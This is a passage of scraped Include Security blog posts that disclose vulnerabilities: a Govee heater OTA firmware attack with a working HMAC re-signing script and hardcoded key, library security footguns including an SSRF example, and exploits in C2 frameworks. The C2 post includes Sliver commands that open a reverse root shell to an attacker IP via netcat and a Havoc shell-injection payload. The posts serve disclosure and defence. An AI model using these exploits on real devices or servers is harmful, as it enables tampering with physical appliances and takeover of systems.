file:\n#!/usr/bin/env python # Note: the constants in this file are specific to modifying the firmware image 62c9486b3b668992ebb413cc2ee0ad4e-H7135_CMS726_WIFI_BLE_HW1.02.00_SW1.00.13_OTA.bin import os import hmac FW_FILE_NAME = \"./patched-fw.bin\" HASH_KEY = b\"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x5f\" def main(): file = open(FW_FILE_NAME, \"r+b\") # Patch the ota_signature hash, which covers the serial/version number file.seek(32*7, os.SEEK_SET) data = file.read(0x60) hm = hmac.new(HASH_KEY, data, 'sha256') digest = hm.digest() print(f\"OTA Signature {hm.hexdigest()=}\") file.seek(0, os.SEEK_SET) file.write(digest) # Patch the HMAC hash value for the first block file.seek(0, os.SEEK_SET) data = file.read(0x2ae0) hm = hmac.new(HASH_KEY, data, 'sha256') digest = hm.digest() print(f\"First block {hm.hexdigest()=}\") file.seek(0x2ae0, os.SEEK_SET) file.write(digest) # Patch the HMAC hash value for the second block file.seek(0x4000, os.SEEK_SET) data = file.read(0x9eb00) hm = hmac.new(HASH_KEY, data, 'sha256') digest = hm.digest() print(f\"Second block {hm.hexdigest()=}\") file.seek(0xa2b00, os.SEEK_SET) file.write(digest) # Patch the HMAC hash value near the end of the image file.seek(0xa4000, os.SEEK_SET) data = file.read(0x31900) hm = hmac.new(HASH_KEY, data, 'sha256') digest = hm.digest() print(f\"End of file {hm.hexdigest()=}\") file.seek(-68, os.SEEK_END) file.write(digest) # Patch the checksum value at the very end of the image file.seek(0, os.SEEK_SET) data = file.read() cksum = 0 for i in range(len(data)-4): cksum += data[i] cksum = cksum & 0xFFFFFFFF file.seek(-4, os.SEEK_END) print(f\"{cksum=}\") file.write(cksum.to_bytes(4, 'little')) file.close() if __name__ == \"__main__\": main()\nAt this point, it was possible to modify a firmware file, run the script to fix the HMAC and checksum values, and use the Flask app to flash the firmware over the WiFi.\nMaking the firmware do something interesting\nWe wanted to made a proof-of-concept modification to the firmware that would make it obvious that the firmware had been modified. When the heater turns on or off it triggers a relay (physical electronically controlled switch), making an audible click, so we focused on that.\nBy watching the debug and main UART connections, we identified the command sequences that the module sends to turn on and off the heater.\nUsing the section address values from the firmware headers, we extracted the firmware sections and loaded them into the correct locations in Ghidra’s memory map. Once in Ghidra we found the reference to the “uart send:” string that we saw on the debug UART. Luckily, the firmware contained many debugging strings. From the debugging strings, we learned that the reference to “uart send:” was in a FreeRTOS task, and it was reading UART bytes from a FreeRTOS queue. By following references to the queue handle, we identified a function named Govee_Uart_Protocol_Package (the name was referenced in debug strings), which was used to encode the messages sent on the main UART connection. We decided this function was a good target for modification. We replaced some error-checking code at the beginning of the function with code that replaced every message it was asked to encode with a “turn on the heater” or a “turn off the heater” message.\nThe module is sending messages on the main UART often – heartbeat messages, commands to get sensor data, etc. With our modified code, each of those messages is changed into a “turn on” or “turn off” command. Once we flashed this firmware it was immediately obvious that the device had been hacked – it would incessantly click on and off as long as it was plugged in.\nThis video shows the attack against the disassembled space heater. In the upper left is wireshark, and in the bottom right is the debug UART output. In the video, you can see:\n- The check version request as green (HTTP) packets\n- The modified firmware being downloaded\n- The firmware checksum verification and flashing\n- Almost a minute later, the module reboots and you can see it (and hear it, if you turn on audio) clicking on and off\n- At the end of the video is a clip of the modified firmware running on a space heater with unmodified hardware.\nThe debug UART messages get more verbose after our patch because we use one of the higher bits in the log level variable to store the toggle state (whether we just turned the heater on or off). Fair warning, the audible clicking sound starts around the 1:27 mark:\nConclusions\nWe reached out to Govee with our findings and they promptly responded acknowledging the issue as a product security concern. They stated they would be taking the following remediation actions:\n- Implementing asymmetric encryption for firmware updates.\n- Transitioning all network communication from HTTP to HTTPS or MQTTS protocols.\nHowever, the Include Security team was not given a timeline for when these changes would be implemented.\nIf mitigations are implemented as normal firmware updates, then unplugging and re-powering a device should cause it to update. In the mean time, users can disconnect their devices from the WiFi network, though this will limit functionality.\nFrom a developer perspective, OTA firmware updates should be secured by using an authenticated and encrypted HTTPS connection if possible, and a secure boot implementation that verifies firmware integrity should be put in place. In this device, the WiFi module was capable of making HTTPS connections, and did in some cases, but the OTA process was one case where it didn’t. The module appeared to support a more robust secure boot implementation, which was not used. Also, the OTA process would ideally cryptographically verify an update before trying to boot it, rather than relying on a simple checksum as an integrity check.\nAttackers are going to generally look for the easiest vulnerabilities to exploit with the highest impact. Unverified OTA firmware updates are a relatively simple to attack, and are high-impact – any device software functionality can be modified. We don’t have statistics on how common unverified OTA schemes are in IoT and smart appliances, but it may be telling that we found one so easily.\nIn this case, we found development tools that documented the firmware format of the WiFi module. Since WiFi and Bluetooth are difficult to implement from scratch, modules like the one in this space heater have become popular. The more ubiquitous a module is, the more likely tools for developing software for it are readily available online, and the easier it becomes to hack devices based on those modules.\nVulnerability Disclosure Timeline\n- April 17, 2024 – Initial vulnerability writeup and details are sent to support@govee.com.\n- April 18, 2024 – Govee security team (security@govee.com) reaches out to IncludeSec acknowledging the vulnerability and lists remediation actions Govee intends to take that will address the vulnerability.\n- April 24, 2024 – IncludeSec reaches out to the Govee security team inquiring about a release schedule for the planned remediation actions in an effort to coordinate vulnerability disclosure.\n- May 9, 2024 – Govee notifies IncludeSec that they are “actively conducting urgent reviews and validations to ensure the effectiveness and stability of the vulnerability fix solution”. A remediation timeline had not yet been established, and the IncludeSec team would be contacted once that changed.\n- July 2, 2024 – The IncludeSec team informs Govee over 90 days had passed since the original vulnerability disclosure date and that IncludeSec intended to publish its findings within the month per the disclosure standard followed by Google (https://about.google/appsecurity/). IncludeSec asks Govee to provide any updated information regarding a remediation timeline.\n- July 2, 2024 – The same day, Govee responds stating “the release schedule for this update is still being finalized, and we will notify you as soon as a date is confirmed. We anticipate that the development will be completed by early September 2024. Due to the ongoing development of the security firmware, we kindly request that details of the vulnerability not be disclosed at this time”.\n- July 17, 2024 – IncludeSec responds stating they will wait until September to publish the vulnerabilities details due to the challenges associated with updating firmware security en masse to the public.\n- July 18, 2024 – Govee responds stating their remediation timeline has been updated and that “our current estimate is that we will complete the full deployment of the fix by the first half of 2025.”\n- Jan 21, 2025 – IncludeSec team reaches out informing Govee that the team still intends to publish its findings and to inquire about any status updates regarding remediation efforts. No reply is received.\n- Jan 27, 2025 – IncludeSec team reaches out again, notifying Govee that the vulnerability details will be published in February of 2025, and requesting any final context Govee wishes to provide before that time. No reply is received.\n- February 4, 2025 – IncludeSec publishes the vulnerability details.\nSince this post was originally written and communication with the Govee team paused in mid-2024, the Consumer Product Safety Commission recalled multiple models of Govee space heaters, including the model our team was testing (H7135), stating:\n“The smart electric space heaters can overheat, posing fire and burn hazards. Testing determined the smart electric space heaters do not comply with the voluntary industry safety standard, UL 1278, posing an overheating and fire risk from wireless control features.” – GoveeLife and Govee Smart Electric Space Heaters Recalled Due to Fire and Burn Hazards; Imported by Govee\nThe article states that “113 reports of overheating, including seven reports of fires and one report of a minor burn injury” were associated with the recalled devices. IncludeSec is not aware whether the vulnerability details described in this post contributed to the recall.", "timestamp": "2025-10-21T13:34:14.291208"}
{"source": "blog", "feed": "https://blog.includesecurity.com/rss", "title": "Spelunking in Comments and Documentation for Security Footguns", "url": "https://blog.includesecurity.com/2024/11/spelunking-in-comments-and-documentation-for-security-footguns/", "published": "Wed, 20 Nov 2024 19:00:43 +0000", "content": "When we perform security assessments at Include Security, we like to have a holistic view of the application and attack from multiple angles. For me, this means going deeper than just looking at client code and also exploring third-party libraries and frameworks used by the application. Doing a full security assessment of every third-party component is not feasible during an engagement, but documentation and comments for these projects have given me a lot of insight quickly. This has yielded very practical security bugs in the context of real assessments at Include Security. Because of this, I always include this step as part of my methodology. Join me as we look at some security footguns that I’ve encountered during security assessments across a wide variety of languages and libraries. But before we continue, let’s define what a footgun is first.\nAny feature likely to lead to the programmer shooting themself in the foot.\nWiktionary\nEnough said, and the focus of this post will be around footguns that have security implications. We’ll start off with two footguns: one in an Elixir library and the other in a Python library. Afterwards, we’ll dig a little deeper into three footguns in the Golang standard library that many people might not be aware of, unless you were part of these conversations:\n- proposal: net/url: add AppendQuery\n- net/http/httputil: ReverseProxy can remove headers added by Director\n- encoding/json: bad encoding of field with MarshalJSON method\nI also wanted to spark a larger conversation around how we can better track these types of issues, that might not cleanly fall into the security vulnerability category.\nElixir’s Tesla\nThe first footgun can be described as overly flexible behavior unexpectedly designed for convenience rather than security. Tesla is a commonly used HTTP client in the Elixir world. This library had an interesting behavior that felt unexpected, yet was fully documented. While I was performing a security assessment I came across code similar to this pseudocode:\nbase_url = \"https://example.com\" client = build_client(config, base_url, headers) user_controlled_path = \"/hello\" response = Tesla.get(client, user_controlled_path)\nThe application took a user controlled path and appended it to the base URL that was defined. As a result it would make a GET request to https://example.com/hello\n. All fine and dandy, right?\nLet’s look a bit closer at the library code, particularly this function:\ndefp apply_base(env, base) do if Regex.match?(~r/^https?:\\/\\//i, env.url) do # skip if url is already with scheme env else %{env | url: join(base, env.url)} end end\nSo when base\nis applied it first checks to see if the URL passed to the client starts with a scheme like http://\nor https://\nand if it does then it skips applying the base URL entirely. By supplying a full URL in user_controlled_path\nsuch as https://attacker.com/hello\nwe can bypass the defined base_url\n. This behavior resulted in server-side request forgery in a real engagement, but I couldn’t shake the feeling that the default behavior felt wrong. So I went to the documentation and read this:\nSet base URL for all requests. The base URL will be prepended to request path/URL only if it does not include http(s). ## Examples defmodule MyClient do use Tesla plug Tesla.Middleware.BaseUrl, \"https://example.com/foo\" end MyClient.get(\"/path\") # equals to GET https://example.com/foo/path MyClient.get(\"path\") # equals to GET https://example.com/foo/path MyClient.get(\"\") # equals to GET https://example.com/foo MyClient.get(\"http://example.com/bar\") # equals to GET http://example.com/bar\nThe documentation clearly defined this behavior, so did that make this a security bug or just user error? I wonder how many people would expect this behavior without having read the documentation.\nThe Pyscopg Minefield\nFor our second footgun, a subtle difference in syntax is all it takes to introduce a vulnerability. Pyscopg is a PostgreSQL driver for Python and from a security point of view SQL injection is the primary concern. While performing a security review I went to the documentation for the library and it was filled with a ton of “wrong” and “correct” ways of performing queries. One of the examples was the following:\n>>> cur.execute(\"INSERT INTO numbers VALUES (%s, %s)\" % (10, 20)) # WRONG >>> cur.execute(\"INSERT INTO numbers VALUES (%s, %s)\", (10, 20)) # correct\nYes, that one character difference is all it takes for a SQL injection vulnerability to appear. Although, the documentation has a pretty clear warning that states the following:\nNever, **never**, **NEVER** use Python string concatenation (`+`) or string parameters interpolation (`%`) to pass variables to a SQL query string. Not even at gunpoint.\nIn general, when I read documentation for libraries that show lots of examples of wrong and correct ways of doing things my radar lights up and I start looking closer. Often those examples were included because of developers “misusing” the library. What are the chances that the developers for the security assessment I was performing also misused the library?\nGitHub Spelunking\nI was working on a project that used Golang and I was looking for security issues related to a particular package in the standard library. So I went to the Golang repository and started searching. As I was going through issues, I had a sudden realization. There are a lot of issues that have been reported with security implications that have had some interesting discussions, maybe had been resolved, and then life just continued. For lots of these issues, there was never a CVE filed or a security advisory created, and maybe that’s okay. But it does mean that there may be security bugs or footguns lying around that many people might not know about.\nFor each of these GitHub issues, I will dive a bit into the issue with references to some code and talk about the security implications of each one. I reference each issue from where I first discovered it so feel free to also read through the comments there for more context.\nReverseProxy May Remove Headers\nThis footgun is due to the library correctly implementing an RFCs, but causing an unexpected clash with the high-level design of another component. The GitHub issue was very thorough and well written, so I would recommend jumping there to read it first and then come back here.\nhttputil.ReverseProxy\nis an HTTP Handler that is commonly used for proxying requests and responses in Go. The Director\nfunction is used for modifying requests that come in and is commonly used for adding headers. The issue with Director\nis that ReverseProxy\n, compliant with RFC 7230, will remove hop-by-hop headers after the Director\nfunction may have added headers. As stated in the issue:\nWhen ReverseProxy forwards a request, it follows the following steps in order:\n1. Clone the incoming request to produce an outbound request,\noutreq\n.2. Pass\noutreq\nto theDirector\nfunction, which may modify it.3. Remove hop-by-hop headers from\noutreq\n.4. Send\noutreq\nto the backend.\nA request made by a user could include a header such as Connection: forwarded\n. This would cause the header Forwarded\nadded by Director\nto be dropped right after it was added.\nTo maintain backwards compatibility, a new function called Rewrite\nwas added that is not affected by hop-by-hop headers. The following note was left for the Director\nfunction:\n// Hop-by-hop headers are removed from the request after // Director returns, which can remove headers added by // Director. Use a Rewrite function instead to ensure // modifications to the request are preserved.\nThere are likely still a lot of people using Director\nthat are unaware about this behavior and still others who come across tutorials and guides that push Director\nas the best way to modify requests for ReverseProxy\n. This behavior isn’t a security issue by itself, but in the case where your origin server is expecting a header and not receiving it due to user forcing a header to be dropped, it could lead to some funky behavior.\nTo help others catch this behavior we created a Semgrep rule that is part of the official ruleset.\nAccidentally Mutate Shared URL Struct\nThis footgun involves the mutation of a shared struct, but may not be apparent to developers that use the struct. A typical scenario is a shared URL struct being used between HTTP requests of different users and a mutation from one request affecting a separate request later on. The following goes over a scenario involving one such case with redirect URLs.\nFrom the GitHub issue that was reported:\nIt’s pretty easy to accidentally mutate a shared URL struct when trying to create a URL with query parameters:\nvar redirectURL, _ = url.Parse(\"https://example.com\") // #1 func main() { http.ListenAndServe(\"\", http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { u := redirectURL // #2 q := u.Query() // #3 // opaque process that might fail token, err := getRedirectToken() if err != nil { q.Set(\"error\", err.Error()) } else { q.Set(\"token\", token) // #4 } u.RawQuery = q.Encode() // #5 http.Redirect(w, r, u.String(), http.StatusFound) })) }\nSo what’s actually happening in this example code? Let’s walk through it step by step.\n1. First, the redirectURL\nvariable is created to store a URL\nstruct pointer (since that’s what url.Parse\nreturns). This is the URL that HTTP clients will be redirected to.\n2. When a request comes in, create a temporary variable u\nto hold the same pointer as redirectURL\n.\n3. Call u.Query()\nto parse RawQuery\nfrom redirectURL\nand create a map stored in q\nwith the existing URL parameters.\n4. Call q.Set(\"token\", token)\nto set a query parameter. If getRedirectToken\nfails then we set the error\nquery parameter instead.\n5. Set u.RawQuery\nto q.Encode()\n, thus overriding the shared URL\nstruct that will be used for future requests.\nThis has some interesting security implications since now we are mutating the URL\nstruct that is used between requests. This could lead to unexpected behavior. A lot of developers might not be aware that they are even dealing with a pointer to the URL struct!\nFor example, a future request might fail when executing getRedirectToken\nand never get to #4. Now, instead of setting the token\nURL parameter, the error\nparameter gets set instead. This means that the redirect URL will now have both the previous token\nparameter and the new error\nparameter due to starting off with RawQuery\nfrom the previous request.\nAs of writing this post, the issue was still open with some ideas around implementing a Clone()\nmethod floating around. For now, it might be a better idea to do a shallow copy of the URL like u := *redirectURL\nor just re-parse the URL every request.\nTo help others catch this behavior we created a Semgrep rule that is part of the official ruleset.\nUnexpected JSON Encoding of a Field\nThis footgun is a bit different than the rest as it involves an unexpected library bug or inconsistency that is now baked-in behavior. The GitHub issue reporter included the following example code for JSON marshalling.\npackage main import ( \"encoding/json\" \"os\" ) type T bool func (v *T) MarshalJSON() ([]byte, error) { return []byte{'1'}, nil } type S struct { X T } func main() { v := S{true} e := json.NewEncoder(os.Stderr) e.Encode(v) // should print {\"X\":true} e.Encode(&v) // should print the same value }\nWhat did you expect to see?\n{\"X\":true} {\"X\":true}\nWhat did you see instead?\n{\"X\":true} {\"X\":1}\nDepending on whether the struct being encoded was a pointer or not, the output changed. Everyone in the thread agreed that this is inconsistent and unexpected behavior. This could also lead to security bugs depending on the context.\nThis issue had an existing Semgrep rule created by dgryski. On August 21, 2024 the issue 606495 on the Go bug tracker resolved this inconsistency, but it doesn’t appear to have made it in the recently released Go 1.23. The GODEBUG setting jsoninconsistentmarshal\nwill allow users to revert the new behavior once it has been released.\nConclusion\nAll of the behaviors that I talked about here have never had any CVEs assigned. But should they even have had one assigned? The issue is that a lot of these behaviors aren’t necessarily a security vulnerability in itself, but in just the right context and usage they very well may be. A lot of these behaviors can also be avoided by reading the code and understanding the limitations or unique behaviors. I think footguns are a good way to describe all of these issues, since unless you are intimately familiar with the relevant code and context, you will probably end up shooting yourself in the foot. If we’re being honest, sometimes the real solution for these is re-designing the library to make it harder to do the wrong thing, whether that’s through interface re-design or better defaults.\nAt minimum, these behaviors should be documented. Additionally, rules for Semgrep or your language-specific static analysis tool, would be an ideal place to document these types of behaviors. I think that this is a really great way to get awareness to developers at a lot of different companies that already are using static analysis tools in their pipelines. So if you come across an-almost-but-not-quite security issue I would highly recommend creating a rule and sharing it with the world. You never know who you’ll help out!", "timestamp": "2025-10-21T13:34:14.824668"}
{"source": "blog", "feed": "https://blog.includesecurity.com/rss", "title": "Vulnerabilities in Open Source C2 Frameworks", "url": "https://blog.includesecurity.com/2024/09/vulnerabilities-in-open-source-c2-frameworks/", "published": "Wed, 18 Sep 2024 19:23:24 +0000", "content": "Application and source code security assessments are the primary focus of our work at Include Security, but sometimes network pentesting that uses software written by other hackers is needed. I decided to investigate open source Command & Control (C2) frameworks used in network and red teaming assessments to understand how they work, and ended up finding a fun mix of authenticated and unauthenticated RCE (remote code execution) vulnerabilities.\nThis post provides an overview of C2 concepts, gives a brief survey of current open source frameworks, and reviews the details of identified vulnerabilities (with reproduction gifs included!). The post concludes with some final thoughts about the current state of the C2 landscape and what future developments might look like.\nC2 Frameworks\nOpen source C2 frameworks have been getting a lot of attention in the past few years. The closed source Cobalt Strike has been the undisputed king of C2, but open source alternatives are seeing more usage among red teamers, threat actors, and hobbyists. Open source alternatives don’t have sky-high licensing costs, and have the potential to fly under the radar in a world where Cobalt Strike’s default behaviors are heavily profiled and fingerprinted.\nA quick recap: a C2 framework is infrastructure used for controlling and maintaining access to hacked computers. C2 frameworks simplify the process for their “operators” (red teamers/pentesters/hackers) who are attacking a targeted network or organization. A term that is often associated with C2 frameworks is “post-exploitation”: C2 frameworks are designed to assist attackers who have already gained some level of control over a target’s computer, whether through phishing, web vulnerabilities, or supply chain attacks. The post-exploitation phase quickly becomes messy without a central management platform, especially for teams of operators collaborating together. C2 frameworks aim to solve that problem by packaging together three components: agent, teamserver, and client.\nArchitecture\nA C2 framework consists of the following three components:\n- Agent (also known as Implant/Demon/Beacon) – malware run on targeted systems that connects back to the teamserver, maintains access, and executes commands on the compromised system.\n- Teamserver – central backend service that receives call-backs from agents launched on hacked systems, and communicates with the agents. Has an API or some other interface to enable operators to interact with the teamserver and issue instructions to the agents.\n- Client – web interface or program run locally by the operator to connect to the teamserver, providing a UI to manage operations. In less mature C2 frameworks, the client may just be a command line interface (CLI) presented by the teamserver after it has started, rather than a separate component running on the operator’s own computer.\nThat description is the bare minimum that a C2 framework should do. Normally, an agent has features to avoid detection by antivirus and endpoint detection and response (EDR) products, together with modules to enumerate information about the compromised system and attack further systems. Likewise, a teamserver normally provides a suite of functionalities, including generating agent binaries for a range of target architectures and operating systems; managing files exfiltrated from targeted systems; implementing a range of transport protocols for agent-teamserver traffic to bypass firewall rules; and encrypting and authenticating the agent-teamserver traffic.\nAdditional terminology that is shared among C2 frameworks:\n- Loot – files, credentials, and screenshots downloaded/exfiltrated from compromised systems and stored on the teamserver\n- Listener – a port opened on the teamserver to listen for agent callbacks\n- Handler – backend code that executes on the teamserver in response to an agent callback, e.g. a handler could receive and download loot from the agent to the teamserver\n- Task – a queued operation that the operator wants an agent to perform\n- Beacon interval – a regular time period (e.g. every 30 seconds) that the agent waits in between checking into the teamserver listener to see if it has any tasks to perform. Done because it is stealthier than a persistent connection\n- Stager – a minimal piece of code executed on a compromised host that is designed to fetch and run a full C2 agent. It is stealthier and easier to deploy than a multi-megabyte agent\n- Stager listener – service running on the teamserver that delivers the full agent in response to a stager callback\n- Redirector – server that receives agent callbacks and forwards them to the teamserver. Aims to hide the teamserver’s IP address and make the agent-teamserver communications look like regular traffic\nThe following diagram shows typical usage of a C2 framework:\nOpen Source C2 Frameworks\nOpen source C2 frameworks each have a different feature-set, different UI, slightly different terminology, and are written in a variety of programming languages. However modern frameworks tend to fall into two camps: those written in Golang, and those written in C#. Golang and C# are both solid languages for all three components of the C2 stack, meaning the agent, teamserver, and client can be written in the same language. Python is also a popular choice for C2 teamserver and clients, while older C2 frameworks made heavy use of PowerShell for agents, from the era when it was easier to run malicious PowerShell code on Windows undetected.\nMost C2 frameworks are passion projects started by individuals or small teams of contributors, and many once-popular frameworks are no longer under active development. There are resources that aim to make it easier to choose the right C2 framework such as the C2Matrix questionnaire, but several suggested frameworks were abandoned a long time ago. The most useful recent ranking I found was an elimination tournament bracket created by the Atomics on a Friday podcast in April 2024. The voting saw Mythic, Sliver, and Havoc take the podium as the top community picks.\nOne interesting limitation of traditional C2 frameworks is that a framework bundles the agent, teamserver, and client together and each component is usually difficult to swap out. I found that some frameworks had fairly advanced agents, but had primitive control and collaboration code. Meanwhile, other C2 frameworks have a great UI, with operator role management, attack graphs, reactive frontend, but unsophisticated and unstealthy agents. This tight coupling of components is being addressed by modern modular frameworks which we’ll talk more about later.\nC2 Framework Threats\nOperators use C2 frameworks to streamline management of complicated campaigns. C2 frameworks provide a way for multiple operators to co-ordinate when performing post-exploitation of targets. However, design flaws and bugs in the C2 frameworks can lead to security risks against the campaigns and the red team operators themselves.\nHere are some of the possible threats against C2 frameworks:\nC2 Framework Vulnerabilities\nWith the background covered, let’s now look at individual C2 frameworks.\nSliver\nSliver Intro\nSliver is a love letter to offensive Golang: the agent, teamserver, and client are all written in Go. Anyone who enjoys the Linux command line will feel at home with Sliver’s UI which is a CLI, although it’s also possible to write a custom client. The architecture and code are high quality, with GRPC over mTLS for client-server communications and the option to use mTLS, Wireguard, HTTPS or DNS as the transport protocol for agent-server traffic.\nI found Sliver’s agents (“implants”) to be powerful and reliable while pivoting and escalating privileges on HackTheBox ProLabs Active Directory networks. Sliver offers several methods to execute third party tools, and the real magic of Sliver is the armory feature which offers a huge number of extensions, plus it’s easy to add your own. The agents also support running beacon object files (BOFs), a position independent code format developed by Cobalt Strike, so Sliver gains access to the open source library of BOFs. For learning there’s an excellent series of blog posts by Dominic Breuker.\nAuthenticated Command Injection\nWhile reviewing the stager code for the latest prerelease version of Sliver (1.6.0) I found a way for any Sliver operator (i.e. authenticated user) to get a root shell on the teamserver. This breaks Sliver’s threat model where “there is a clear security boundary between the operator and server, an operator should not inherently be able to run commands or code on the server.” Sliver has a multiplayer mode and is adding role-based access control to assign fine-grained privileges to operators. A red team operation usually consists of a number of individuals, and the compromise of one low-privileged team member should not lead to total administrative control over the server.\nIt’s also just a really fun vulnerability since we get the teamserver to pwn itself with Metasploit. We essentially execute a Metasploit stager payload on the server rather than sending it to the operator client to deploy on a target system. I reported this vulnerability to the Sliver team and it was fixed as CVE-2024-41111 before it was released in a stable build.\nSliver has support for Metasploit stagers. Under the hood, the Metasploit stager calls msfvenom\nusing Go’s exec.Command()\n. User options are validated before being interpolated into the command string. Last year a feature was added to provide advanced options to the stager. The intention behind the change was to control options such as EXITFUNC=thread\n, however the change allows additional command line arguments to be specified to msfvenom\n. One argument of msfvenom\nis --out\n, which writes the payload to a file rather than to standard output. This enables us to write the msfvenom\npayload to an arbitrary file on the teamserver.\nWe overwrite one of Sliver’s own bundled binaries at /root/.sliver/go/bin/garble\n:\nsliver > generate msf-stager --lhost 192.168.0.128 --lport 8888 --advanced --platform=linux&--payload=linux/x64/shell_reverse_tcp&--format=elf&--out=/root/.sliver/go/bin/garble [*] Sliver implant stager saved to: [...]\nSetup a netcat shell on the attacking system 192.168.0.128 on port 8888. Then trigger the exploit by running an agent compilation command which indirectly executes /root/.sliver/go/bin/garble\n:\nsliver > generate beacon --mtls 1.2.3.4 [*] Generating new windows/amd64 beacon implant binary (1m0s) [*] Symbol obfuscation is enabled та╝ Compiling, please wait ...\nA root shell will pop:\n$ nc -lvp 8888 Listening on 0.0.0.0 8888 Connection received on 192.168.0.183 39238 whoami root\nThe Sliver team remediated the vulnerability by removing the generate msf-stager\ncommand, and the documentation now instructs operators to generate their own Metasploit stagers locally rather than on the teamserver. The Sliver team were a pleasure to talk to, and sent a bottle of whiskey as part of their beverage-based bug bounty incentives.\nHavoc\nHavoc Intro\nHavoc‘s teamserver is also written in Go, but the client is C++ and has a Qt GUI, and the agent is written in C and ASM. The main advantage of Havoc over Sliver is the cool GUI, which resembles Cobalt Strike with the visualization of active sessions on hacked machines. I found Havoc’s code to be less mature than Sliver’s, with sketchy stuff in a few places, although it is improving as the devs refactor the original codebase. The default Havoc agent (“demon”) has the ability to execute shellcode in remote processes using process injection, and execute BOF files via .NET inline assembly. Compared to Sliver there’s a smaller extension library with a little more overhead required to write an extension. Considering that Havoc was started as a hobby project by a teenage developer, it’s extremely impressive and has probably the best UI of any C2 framework.\nAnother Authenticated Command Injection\nHavoc has an authenticated RCE vulnerability in the teamserver that is similar to the one in Sliver. Further, the default Havoc configuration creates two users with the password “password1234”, so anyone careless enough to run Havoc with default settings on an untrusted network can immediately be exploited by this RCE vulnerability. Teamservers that are firewalled off can still be hit due to a cool SSRF vulnerability discovered by chebuya recently.\nAn exec.Command()\ncall is used to compile custom agents on behalf of users, and every client parameter is sanitized except one: the “Service Name” field. Because sh -c\nis the program run, the compilation command can be cancelled and an arbitrary command can be run instead. The results can even be viewed in the Havoc UI although the whole attack can also be automated by speaking the teamserver’s WebSockets protocol.\nAn injection payload into the service name field looks something like \\\" -mbla; CMD 1>&2 && false #\n:\n\\\"\nto exit out the quotes-mbla\nto cause the MinGW compilation to fail and not have to wait for itCMD 1>&2\nwith the chosen payload redirected to stderr&& false\nto cause the command to fail and the server to send back the stderr output#\nto comment out the parameters after our injection\nService API Authentication Bypass\nSome time before this, I also found an authentication bypass in Havoc’s Service API feature. The authentication logic loops through usernames and passwords, but if none matched, then the function didn’t return false. This meant that a malicious service could connect to a teamserver, provide the wrong password, and just continue sending messages to the teamserver that the teamserver would treat as authorized.\nThe Service API code is separate from the user agent generation code, otherwise put together there could have been a full unauthenticated chain to root against the Havoc teamserver with these two vulnerabilities.\nIn response to the disclosure, the Havoc developer gave credit in Havoc’s release notes, added me to a private members/contributors channel, and invited me to find more bugs. The service API authentication bypass is fixed but the authenticated RCE is still present in the master branch of Havoc as all development effort is now focused on the rewrite branch.\nNinja\nNinja Intro\nI’d found authenticated RCEs in two popular open source C2 frameworks, but didn’t find a way to upgrade these into fully unauthenticated RCEs. For that I needed to look into lesser-known frameworks.\nNinja C2 is based on the leaked MuddyC3 code used by an Iranian APT group. The teamserver is written in Python and the agents use PowerShell. Its design goal is stealth, with a number of behaviors changing each time a new campaign is launched. For example, the teamserver generates obfuscated webserver callback URLs that change with each campaign. Many of the features of Sliver and Havoc are present albeit in a more basic form. The associated blog posts claims that when newly-released, Ninja was able to bypass major AV and SIEM products, showing that an unfamiliar attack signature is everything when it comes to stealth.\nUnauthenticated Arbitrary File Download\nThe Ninja webserver is vulnerable to unauthenticated arbitrary file download via path traversal. This leads to immediate RCE against the teamserver when it’s running as root, or RCE upon the next restart of the teamserver.\nThe preconditions of the vulnerability are the same as the Skywalker exploit against the Empire framework from 2016, a classic C2 framework vulnerability that has its own Metasploit module. The Skywalker exploit occurs when:\n- The teamserver contains a download endpoint that an agent can call.\n- The agent can provide the full filepath of the file it is uploading to the teamserver.\n- The filepath parameter is vulnerable to path traversal.\nNote that none of three preconditions are true for Sliver. In Sliver, downloads only occur when an operator requests them; the agent has no control over the filepath; and the filename is set by the client using the basename rather than the full path of the file.\nIn Ninja’s case, an agent also doesn’t require any special secret to register with the Ninja teamserver. A malicious fake agent can call the register endpoint, then upload a malicious file to an arbitrary filepath on the teamserver. The only speedbump is that URL endpoints are randomly picked from a list for each campaign, but the endpoint list is short enough to be brute-forced. The exploit script implements this with a reverse shell callback in a crontab.\nI reached out several times to the Ninja developer but did not receive a response.\nSHAD0W\nSHAD0W Intro\nSHAD0W is a C2 framework with a Python backend and agents written in C. It was popular three years ago, but has not seen any further development since. The UI is a cool hacker CLI similar to Sliver. SHAD0W’s main feature is its modularity, with a clean codebase and straightforward protocol for adding new commands and modules. The other focus is stealth, with an agent that implements anti-DLL injection, dynamically resolved syscalls, and thread hijacking for process injection. I think it’s a shame that SHAD0W’s development stopped as I found it easier to jump in and understand the code for this framework compared to most others.\nUnauthenticated RCE\nSHAD0W is vulnerable to unauthenticated RCE where untrusted input provided by agents is injected into commands run on the teamserver. When a new agent (“beacon” in SHAD0W terminology) checks in to the teamserver, the beacon reports the architecture, operating system, domain and other information about the compromised system.\nIn SHAD0W, beacon modules are compiled on-demand on the teamserver for the target system. Several modules in SHAD0W use the arbitrary beacon-provided values as parameters when compiling shellcode. For instance, the migrate\nmodule which implements process migration, passes the architecture value to buildtools.make_in_clone()\n. The value is eventually interpolated into an os.system()\nfunction call for the make\ncommand.\nThe beacon-provided values are displayed to the C2 operator when the beacon first connects to the teamserver, so some level of obfuscation is required here to disguise the payload and spark the operator’s curiosity to interact with the beacon. When the operator interacts with the beacon and uses the migrate\nmodule, the attacker’s command executes on the teamserver.\nI reached out several times to the SHAD0W developer but did not receive a response.\nCovenant\nCovenant Intro\nCovenant is another framework that was popular 3-4 years ago, and was the one chosen for the first iteration of Zero Point Security’s Red Team Ops course. The server is written in C# and the client is a C# Blazor webapp. Since then, the framework has seen little development. The framework has a number of neat features including a clean web UI, cryptographic forward secrecy for agent-server communication, and listener profiles for dynamically modifying the way that agent-server communication appears on the wire.\nEscalation of Privilege\nBoth the current master and dev branches of Covenant are vulnerable to an escalation of privilege from User to Administrator. The API blocks editing roles unless you are an Administrator, however in the UI itself it’s possible for a User to give themself the Administrator role.\nThe user now has access to the most powerful feature of Covenant, the ability to create HTTP listener profiles, which is restricted to Administrators. Although there is no built-in way to get a shell on a Covenant server, the HTTP profiles feature essentially enables running C# code on the server as a way of customizing traffic sent to and from agents.\nAnother Authenticated Command Injection\nThe C# code is limited by the fact that the Covenant compiler restricts the System\nnamespace to 